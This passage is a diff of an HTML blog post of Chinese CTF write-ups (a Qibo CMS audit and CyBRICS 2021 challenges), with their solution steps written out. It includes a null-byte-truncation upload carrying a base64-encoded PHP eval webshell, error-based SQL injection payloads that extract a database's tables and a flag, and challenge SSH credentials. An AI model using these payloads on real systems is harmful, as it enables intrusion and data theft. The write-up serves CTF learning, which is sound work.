 &lt;p>————比赛的时候我其实是没有搜到&lt;a href="https://ma4ter.cn/2527.html">齐博建站系统x1.0代码审计&lt;/a>这篇的，当时思路是在后台在找有没有可以利用的地方直接写🐎 ，当时找的是独立页管理，尝试upload，但是并不太行（也可能是我太菜了），然后也没去审代码（懒狗）所以 就没出这个题，现在看还是疏忽了 确实完全没注意到系统在线升级这个模块是可用的 也没有认真的分析源码 我的过&lt;/p>
@@ -2469,7 +2773,7 @@ out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
 &lt;span style="color:#111">}&lt;/span>
 &lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
 &lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>file_put_contents()执行文件写入，内容可控+路径已知，过滤的点在于后缀名是bmp或png 并且只有除去后缀的这文件名可控，php版本是5.2.17，用00截断绕过（post部分要urlencode一下 burp或者hackbar就直接转了&lt;/p>
-&lt;pre>&lt;code>/qbl.php?id=wuhu.php%00a&amp;amp;url=http://baidu.com
+&lt;pre tabindex="0">&lt;code>/qbl.php?id=wuhu.php%00a&amp;amp;url=http://baidu.com
 POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg==
 &lt;/code>&lt;/pre>&lt;p>参考：&lt;a href="https://eastjun.top/2021/08/03/dasctf-july-x-cbctf-4th/">wp&lt;/a>&lt;/p>
 &lt;h2 id="easyweb">easyweb&lt;/h2>
@@ -2525,7 +2829,7 @@ POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg==
 &lt;blockquote>
 &lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
 &lt;p>Alarm! We accidentally did &lt;code>rm -rf /*&lt;/code> on a very important server. Now all that’s left is one shell session.&lt;/p>
-&lt;pre>&lt;code>ssh rmrfer@178.154.210.26
+&lt;pre tabindex="0">&lt;code>ssh rmrfer@178.154.210.26
 Password: sa7Neiyi
 &lt;/code>&lt;/pre>&lt;p>Rescue the &lt;strong>flag.txt&lt;/strong> file from one of the directories by only using your shell&lt;/p>
 &lt;p>&lt;strong>Added at 13:45 —&lt;/strong> frequent question: yes, if you found &lt;code>flag.txt&lt;/code>, the flag is right there, in the open, as plain text. Just read it. If you’re not seeing the flag, try to find another method that will not hide info from you&lt;/p>
@@ -2575,13 +2879,13 @@ Password: sa7Neiyi
 &lt;p>简约漂亮的前端&lt;/p>
 &lt;p>有个输入邮箱的框，提交会发送一个post请求：digest=xxxx&amp;amp;email=xxxx
 尝试一个1@1.com，重放的时候直接修改email值会提示Invalid digest，发现其中digest的值就是md5(&amp;lsquo;&lt;a href="mailto:1@1.com">1@1.com&lt;/a>&amp;rsquo;) 随email而改变，尝试注入&lt;/p>
-&lt;pre>&lt;code>digest=76af11f3eaf7b12e72d7d88e4cf2ee01&amp;amp;email='or'1 // 回显正常 无报错
+&lt;pre tabindex="0">&lt;code>digest=76af11f3eaf7b12e72d7d88e4cf2ee01&amp;amp;email='or'1 // 回显正常 无报错
 digest=c3593d255957d60d5d489ae682da8aee&amp;amp;email=1')# // 报错：Something went wrong during database insert: Column count doesn't match value count at row 1
 digest=5c07c683d062d17ec799fa177ce88058&amp;amp;email=1',1)# // 报错：Something went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1
 &lt;/code>&lt;/pre>&lt;p>确定是sqli 并且当前表有两列 email+timestamp，使用的语句应该是这个吧？&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">insert&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table_name&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">timestamp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">values&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">email&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">now&lt;/span>&lt;span style="color:#111">());&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>可利用的部分是可以插入的email，报错注入&lt;/p>
-&lt;pre>&lt;code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))# // Something went wrong during database insert: XPATH syntax error: '~announcement'
+&lt;pre tabindex="0">&lt;code>digest=e1e79bd6fafe38f7073ec1f3ef1513fa&amp;amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))# // Something went wrong during database insert: XPATH syntax error: '~announcement'
 digest=c9f14624524736a74164cc6024fdefce&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~emails,logs'
 digest=94707222b90505ab0aa5e1fd3916e77d&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or ' // Something went wrong during database insert: XPATH syntax error: '~log'
 digest=66bf6db11d9bee8e897b874a430f5704&amp;amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or ' // Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}'
@@ -2655,7 +2959,7 @@ digest=66bf6db11d9bee8e897b874a430f5704&amp;amp;email=' or updatexml(1,concat(0x
 &lt;p>可以玩出很多花样~&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234351668.png" alt="image-20210728234351668">&lt;/p>
 &lt;p>书归正题，这里使用&lt;code>toilet -f bigascii9 +command&lt;/code>的命令生成结果，将空格换为 &lt;code>.&lt;/code>再发送即可&lt;/p>
-&lt;pre>&lt;code>toilet -f bigascii9 ls &amp;gt; ls.txt
+&lt;pre tabindex="0">&lt;code>toilet -f bigascii9 ls &amp;gt; ls.txt
 cat ls.txt | nc 138.68.83.253 3333 &amp;gt; ls_result.txt
 toilet -f bigascii9 'cat flag.txt' &amp;gt; cat.txt
 cat cat.txt | nc 138.68.83.253 2333 &amp;gt; flag.txt
@@ -2674,7 +2978,7 @@ cat cat.txt | nc 138.68.83.253 2333 &amp;gt; flag.txt
 &lt;p>（说实话，pacp包是真的不会看TAT&lt;/p>
 &lt;p>首先看到有HTTP的流量，访问的是http://192.168.54.1/cam.cgi?mode=getstate，这是Lumix GX80摄像头，视频流通过UDP传输；追踪UDP流量，导出流量 并批量提取出其中的jpg文件
 （以下是官方给出的解 使用了tshark工具（即命令行版的wireshrk（但是这种方法本地复现失败 导出的jpg无法正常解析 但是&lt;a href="https://www.youtube.com/watch?v=Sf_0f8PWNuI&amp;amp;t=80s">官方视频中&lt;/a>确实这样可以成功 emmmm&lt;/p>
-&lt;pre>&lt;code>tshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data &amp;gt; hex.txt
+&lt;pre tabindex="0">&lt;code>tshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data &amp;gt; hex.txt
 php -a
 foreach(file(&amp;quot;hex.txt&amp;quot;)as $i =&amp;gt; $ln) {file_put_contents(&amp;quot;frame$i.jpg&amp;quot;,hex2bin(trim($ln)));}
 &lt;/code>&lt;/pre>&lt;p>（以下是在&lt;a href="https://scavengersecurity.com/posts/cybrics-lx100/">别的wp&lt;/a>中看到的py脚本： 可成功复现 导出455张jpg图&lt;/p>
@@ -2693,7 +2997,7 @@ foreach(file(&amp;quot;hex.txt&amp;quot;)as $i =&amp;gt; $ln) {file_put_contents
 &lt;blockquote>
 &lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
 &lt;p>Remember NET fleeks? I’ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.&lt;/p>
-&lt;pre>&lt;code>ssh localhost@109.233.61.10
+&lt;pre tabindex="0">&lt;code>ssh localhost@109.233.61.10
 Password: ohx7eeQu
 &lt;/code>&lt;/pre>&lt;p>Your team token &amp;gt; Sw0T5cecsfJfaKApOiKzsA&lt;/p>
 &lt;/blockquote>
@@ -2705,11 +3009,11 @@ Password: ohx7eeQu
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131419115.png" alt="image-20210729131419115">&lt;/p>
 &lt;p>提示&lt;em>Flag-containing-Records&lt;/em> 接着访问两个超链接的内容&lt;/p>
 &lt;p>&lt;code>curl 10.193.10.180/redis.conf&lt;/code>是redis的配置文件，几乎所有的内容都是被注释掉的示例内容，有用的就内容并不多：&lt;/p>
-&lt;pre>&lt;code>bind 127.0.0.1
+&lt;pre tabindex="0">&lt;code>bind 127.0.0.1
 protected-mod yes
 port 6379
 &lt;/code>&lt;/pre>&lt;p>&lt;code>curl 10.193.10.180/sysctl.conf&lt;/code>也是相关的配置文件 只有一句没被注释&lt;/p>
-&lt;pre>&lt;code>net.ipv4.conf.all.route_localnet=1
+&lt;pre tabindex="0">&lt;code>net.ipv4.conf.all.route_localnet=1
 &lt;/code>&lt;/pre>&lt;p>查google，发现了这些：&lt;a href="https://github.com/kubernetes/kubernetes/issues/90259">net.ipv4.conf.all.route_localnet=1 opens security issue #90259&lt;/a> | &lt;a href="https://github.com/tabbysable/POC-2020-8558">POC-2020-8558&lt;/a>&lt;/p>
 &lt;p>是一个去年爆出的cve，具体的内容 成因以及背景知识不多赘述 上面的链接中写的很详细，这里摘取几段：&lt;/p>
 &lt;blockquote>
